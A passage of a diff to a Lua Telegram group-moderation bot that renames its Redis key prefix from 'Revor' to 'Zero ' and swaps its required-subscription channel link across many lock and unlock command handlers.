-Redis:set(Revor.."Revor:Lock:Cmd"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Cmd"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الشارحه").lockKid,"md",true)  
 return false
 end 
@@ -6005,10 +6008,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Cmd"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Cmd"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الشارحه").lockKtm,"md",true)  
 return false
 end 
@@ -6017,10 +6020,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Cmd"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Cmd"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الشارحه").lockKick,"md",true)  
 return false
 end 
@@ -6029,10 +6032,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Cmd"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Cmd"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الشارحه").unLock,"md",true)  
 return false
 end 
@@ -6041,10 +6044,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Photo"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Photo"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصور").Lock,"md",true)  
 return false
 end 
@@ -6053,10 +6056,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Photo"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Photo"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصور").lockKid,"md",true)  
 return false
 end 
@@ -6065,10 +6068,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Photo"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Photo"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصور").lockKtm,"md",true)  
 return false
 end 
@@ -6077,10 +6080,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Photo"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Photo"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصور").lockKick,"md",true)  
 return false
 end 
@@ -6089,10 +6092,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Photo"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Photo"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الصور").unLock,"md",true)  
 return false
 end 
@@ -6101,10 +6104,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Video"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Video"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الفيديو").Lock,"md",true)  
 return false
 end 
@@ -6113,10 +6116,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Video"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Video"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الفيديو").lockKid,"md",true)  
 return false
 end 
@@ -6125,10 +6128,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Video"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Video"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الفيديو").lockKtm,"md",true)  
 return false
 end 
@@ -6137,10 +6140,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Video"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Video"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الفيديو").lockKick,"md",true)  
 return false
 end 
@@ -6149,10 +6152,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Video"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Video"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الفيديو").unLock,"md",true)  
 return false
 end 
@@ -6161,10 +6164,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Animation"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Animation"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المتحركه").Lock,"md",true)  
 return false
 end 
@@ -6173,10 +6176,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Animation"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Animation"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المتحركه").lockKid,"md",true)  
 return false
 end 
@@ -6185,10 +6188,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Animation"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Animation"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المتحركه").lockKtm,"md",true)  
 return false
 end 
@@ -6197,10 +6200,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Animation"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Animation"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل المتحركه").lockKick,"md",true)  
 return false
 end 
@@ -6209,10 +6212,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Animation"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Animation"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح المتحركه").unLock,"md",true)  
 return false
 end 
@@ -6221,10 +6224,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:geam"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:geam"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الالعاب").Lock,"md",true)  
 return false
 end 
@@ -6233,10 +6236,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:geam"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:geam"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الالعاب").lockKid,"md",true)  
 return false
 end 
@@ -6245,10 +6248,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:geam"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:geam"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الالعاب").lockKtm,"md",true)  
 return false
 end 
@@ -6257,10 +6260,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:geam"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:geam"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الالعاب").lockKick,"md",true)  
 return false
 end 
@@ -6269,10 +6272,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:geam"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:geam"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الالعاب").unLock,"md",true)  
 return false
 end 
@@ -6281,10 +6284,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Audio"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:Audio"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الاغاني").Lock,"md",true)  
 return false
 end 
@@ -6293,10 +6296,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Audio"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:Audio"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الاغاني").lockKid,"md",true)  
 return false
 end 
@@ -6305,10 +6308,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Audio"..msg_chat_id,"ktm")  
+Redis:set(Zero .."Zero :Lock:Audio"..msg_chat_id,"ktm")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الاغاني").lockKtm,"md",true)  
 return false
 end 
@@ -6317,10 +6320,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:Audio"..msg_chat_id,"kick")  
+Redis:set(Zero .."Zero :Lock:Audio"..msg_chat_id,"kick")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الاغاني").lockKick,"md",true)  
 return false
 end 
@@ -6329,10 +6332,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:del(Revor.."Revor:Lock:Audio"..msg_chat_id)  
+Redis:del(Zero .."Zero :Lock:Audio"..msg_chat_id)  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم فتح الاغاني").unLock,"md",true)  
 return false
 end 
@@ -6341,10 +6344,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:vico"..msg_chat_id,"del")  
+Redis:set(Zero .."Zero :Lock:vico"..msg_chat_id,"del")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصوت").Lock,"md",true)  
 return false
 end 
@@ -6353,10 +6356,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-Redis:set(Revor.."Revor:Lock:vico"..msg_chat_id,"ked")  
+Redis:set(Zero .."Zero :Lock:vico"..msg_chat_id,"ked")  
 LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(msg.sender.user_id,"⌔︙تم قفـل الصوت").lockKid,"md",true)  
 return false
 end 
@@ -6365,10 +6368,10 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
